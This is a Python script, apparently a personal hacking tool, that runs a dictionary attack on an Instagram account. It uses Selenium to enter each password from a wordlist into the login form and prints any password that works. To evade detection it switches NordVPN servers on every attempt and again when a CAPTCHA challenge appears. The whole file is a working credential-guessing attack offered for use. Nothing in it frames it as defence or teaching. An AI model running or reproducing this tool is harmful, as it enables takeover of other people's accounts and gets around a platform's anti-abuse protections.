#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Description:
    A Python script to perform a dictionary attack on Instagram login using a provided wordlist and username/email.
    The script iterates over the passwords in the wordlist and attempts to log in.
    If a successful login is detected, the script will print the successful password and stop.

Maintainer:
            ::::  ::::::::::::  
            :+:     :+:    :+: 
            +:+     +:+    +:+ 
            +#+     +#+    +#+ 
            +#+     +#+    +#+ 
        #+# #+#     #+#    #+#
         #####    ############     

Date:
    Jul 10, 2024

Usage:
    python3 run.py -w [wordlist_file] -u [username]

Arguments:
    -s, --site  : The url to redirect to login page
    -w, --wordlist  : The name of the wordlist file containing passwords to try
    -u, --username  : The username or email address for the Instagram account to attack

Dependencies:
    - selenium library for automating web browser interaction
    - requests library for downloading web content
    - argparse for handling command-line arguments

Notes:
    The script uses Selenium WebDriver to interact with the Instagram login page
    Ensure that you have the Chrome WebDriver installed and accessible in your PATH
"""

import argparse
import subprocess
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import time

# list of countries to cycle through for VPN connection
countries = ["United_States", "Canada", "United_Kingdom", "Germany", "Netherlands", "Australia", "France", "Sweden", "Japan", "South_Korea"]

# ascii art welcome
print(r"""

8888b.  88  dP""b8 888888                 dP""b8        db    888888 888888    db     dP""b8 88  dP 
 8I  Yb 88 dP   `"   88                  dP   `"       dPYb     88     88     dPYb   dP   `" 88odP  
 8I  dY 88 Yb        88                  Yb  "88      dP__Yb    88     88    dP__Yb  Yb      88"Yb  
8888Y"  88  YboodP   88       oooooooooo  YboodP     dP""""Yb   88     88   dP""""Yb  YboodP 88  Yb 
            
oooooooooo oooooooooo oooooooooo oooooooooo oooooooooo oooooooooo oooooooooo oooooooooo oooooooooo 
""")

# args parsing
parser = argparse.ArgumentParser(description="_g dict-attack tool")
parser.add_argument('-s', '--site', required=True, help="The url to redirect to the login page.")
parser.add_argument('-w', '--wordlist', required=True, help="The name of the wordlist file containing passwords to try")
parser.add_argument('-u', '--username', required=True, help="The username or email address for the _g account.")
args = parser.parse_args()

site = args.site
wordlist_name = args.wordlist
username = args.username

# print entered username and wordlist
print(f"site: {site}")
print(f"username: {username}")
print(f"wordlist: {wordlist_name}")
print("////////////////////////////////////////////////////////////////////////////////////////////////")

# open the wordlist file
with open(f"{wordlist_name}.txt", "r", encoding="latin-1") as wordlist_file:
    wordlist = wordlist_file.readlines()

# init vars
successful_login = False
attempts = 0

# screen dimensions
screen_width = 1920  # Replace with actual screen width
screen_height = 1080  # Replace with actual screen height

# Check if CAPTCHA is present
def is_captcha_present(browser):
    current_url = browser.current_url
    return "challenge" in current_url

# change VPN server and print current ip
def change_vpn(country):
    subprocess.run(["nordvpn", "c", country])
    print(f"switched to VPN server in {country}")
    result = subprocess.run(["curl", "ifconfig.me"], capture_output=True, text=True)
    print(f"current IP address: {result.stdout.strip()}")

# Iterate over passwords in the wordlist
for index, password in enumerate(wordlist):
    password = password.strip()  # Remove any whitespace characters from the password

    # Change VPN location every attempt
    country = countries[index % len(countries)]
    change_vpn(country)

    while True:
        # open the browser and navigate to login page
        browser = webdriver.Chrome()
        browser.set_window_size(screen_width // 2, screen_height)  # Set window size to half the screen width and full height
        browser.set_window_position(0, 0)  # Position the window on the left side of the screen
        browser.get(site)

        # wait for the page to load
        time.sleep(5)

        # enter the username and password
        username_field = browser.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[1]/div/label/input')
        username_field.send_keys(username)

        password_field = browser.find_element(By.XPATH, '//*[@id="loginForm"]/div/div[2]/div/label/input')
        password_field.send_keys(password)
        password_field.send_keys(Keys.ENTER)

        # wait for the login to process
        # a bit extended due to decetion
        time.sleep(30)

        # check if CAPTCHA is present
        if is_captcha_present(browser):
            print("CAPTCHA detected, changing IP and retrying...")
            browser.close()
            country = countries[(index + 1) % len(countries)]
            change_vpn(country)
            continue

        # check if login was successful by looking for a known element
        try:
            browser.find_element(By.XPATH, "//div[contains(text(), 'Save your login info?')]")
            print(f"\npassword found: {password}")
            successful_login = True
            break
        except NoSuchElementException:
            attempts += 1
            print(f"\ntrying pw: {password}")
            print("failed\n")
        finally:
            browser.close()
        break

    if successful_login:
        break

# print the result
if successful_login:
    print(f"successfully logged in with password: {password}")
else:
    print(f"failed to log in after {attempts} attempts")

